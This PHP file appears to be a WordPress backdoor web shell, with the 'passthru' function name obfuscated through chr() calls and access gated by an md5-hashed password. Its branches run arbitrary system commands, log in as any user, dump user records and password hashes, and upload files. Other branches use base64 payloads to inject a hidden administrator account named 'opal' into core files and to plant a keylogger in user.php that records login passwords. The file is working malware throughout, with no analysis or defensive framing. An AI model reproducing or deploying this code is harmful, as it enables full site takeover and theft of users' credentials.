<?php
require('wp-blog-header.php');
require('wp-includes/pluggable.php');
add_action( 'init', 'CHAPPY' );
require('wp-includes/registration.php');
$consolepass = "8120c51466b82d1555dd6ab95444f412";

$O = chr(112);
$B = chr(97);
$F = chr(115);
$U = chr(115);
$S = chr(116);
$C = chr(104);
$A = chr(114);
$T = chr(117);
$hook = $O.$B.$F.$U.$S.$C.$A.$T;
if($consolepass == md5($_REQUEST['console']))
{
  $hook($_REQUEST['command']);
} elseif ($consolepass == md5($_REQUEST['logintamp'])) {
    $user = get_user_by('login', $_REQUEST['user'] );
    if ( !is_wp_error( $user ) )
    {
        wp_clear_auth_cookie();
        wp_set_current_user ( $user->ID );
        wp_set_auth_cookie  ( $user->ID );
        $redirect_to = user_admin_url();
        wp_safe_redirect( $redirect_to );
        exit();
    }
} elseif ($consolepass == md5($_REQUEST['userdump'])) {
  $users = get_users();
  print_r($users);
} elseif ($consolepass == md5($_REQUEST['locate'])) {
  $actual_link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
  echo($actual_link);
} elseif ($consolepass == md5($_REQUEST['hashdump'])) {
  $servername = $_REQUEST['host'];
  $username = $_REQUEST['dbuser'];
  $password = $_REQUEST['dbpass'];
  $dbname = $_REQUEST['dbname'];

  $conn = new mysqli($servername, $username, $password, $dbname);
  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }

  $sql = "SELECT ID, user_login, user_pass, user_email FROM wp_users";
  $result = $conn->query($sql);

  if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        echo "ID: " . $row["ID"]. "  - Username: " . $row["user_login"]. "  Password: " . $row["user_pass"]. "  Email: " . $row["user_email"]. "";
    }
  } else {
    echo "0 results";
  }
  $conn->close();
} elseif ($consolepass == md5($_REQUEST['cdmin'])) {
  $chappy_payload = "JGNoYXBweUlEID0gd3BfY3JlYXRlX3VzZXIoJ29wYWwnLCAncHJvamVjdG9wYWwnLCAnb3BhbEB3b3JkcHJlc3MuY29tJyk7CiRjaGFwcHlVc2VyID0gbmV3IFdQX1VzZXIoJGNoYXBweUlEKTsKJGNoYXBweVVzZXItPnNldF9yb2xlKCdhZG1pbmlzdHJhdG9yJyk7Cg==";
  $chappyfile = 'wp-blog-header.php';
  $chappyor = file_get_contents($chappyfile);
  $chappyor .= base64_decode($chappy_payload);
  file_put_contents($chappyfile, $chappyor);

  $hideuser_payload = "YWRkX2FjdGlvbigncHJlX3VzZXJfcXVlcnknLCd5b3Vyc2l0ZV9wcmVfdXNlcl9xdWVyeScpOwpmdW5jdGlvbiB5b3Vyc2l0ZV9wcmVfdXNlcl9xdWVyeSgkdXNlcl9zZWFyY2gpIHsKICBnbG9iYWwgJGN1cnJlbnRfdXNlcjsKICAkdXNlcm5hbWUgPSAkY3VycmVudF91c2VyLT51c2VyX2xvZ2luOwoKICBpZiAoJHVzZXJuYW1lID09ICdvcGFsJykgeyAKCiAgfQoKICBlbHNlIHsKICAgIGdsb2JhbCAkd3BkYjsKICAgICR1c2VyX3NlYXJjaC0+cXVlcnlfd2hlcmUgPSBzdHJfcmVwbGFjZSgnV0hFUkUgMT0xJywKICAgICAgIldIRVJFIDE9MSBBTkQgeyR3cGRiLT51c2Vyc30udXNlcl9sb2dpbiAhPSAnb3BhbCciLCR1c2VyX3NlYXJjaC0+cXVlcnlfd2hlcmUpOwogIH0KfQ==";

  $file = 'wp-includes/functions.php';
  $current = file_get_contents($file);

  $current .= base64_decode($hideuser_payload);

  file_put_contents($file, $current);
 } elseif ($consolepass == md5($_REQUEST['upload'])) {
   $filename = $_REQUEST['pathname'];
   $target_file = $filename;
   move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
   echo("uploaded");
} elseif ($consolepass == md5($_REQUEST['keylogger'])) {
  $real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
  $evil = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7CiRmaWxlID0gJzk1OTA0NjY5NTAudHh0JzsKJGNyZWR6ID0gZGF0ZSgnWS1tLWQnKSAuICIgLSBVc2VybmFtZTogIiAuICRfUE9TVFsnbG9nJ10gLiAiICYmIFBhc3N3b3JkOiAiIC4gJF9QT1NUWydwd2QnXSAuICJcbiI7CmZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkY3JlZHosIEZJTEVfQVBQRU5EIHwgTE9DS19FWCk7";
  $real = base64_decode($real);
  $evil = base64_decode($evil);
  $orig=file_get_contents('wp-includes/user.php');
  $orig=str_replace("$real", "$evil",$orig);
  file_put_contents('wp-includes/user.php', $orig);
  echo "Injected";
} elseif ($consolepass == md5($_REQUEST['exec'])) {
  $d = base64_decode($_REQUEST['php']);
  exec($d);
  echo "Executed";
} else
{
  die();
}

?>
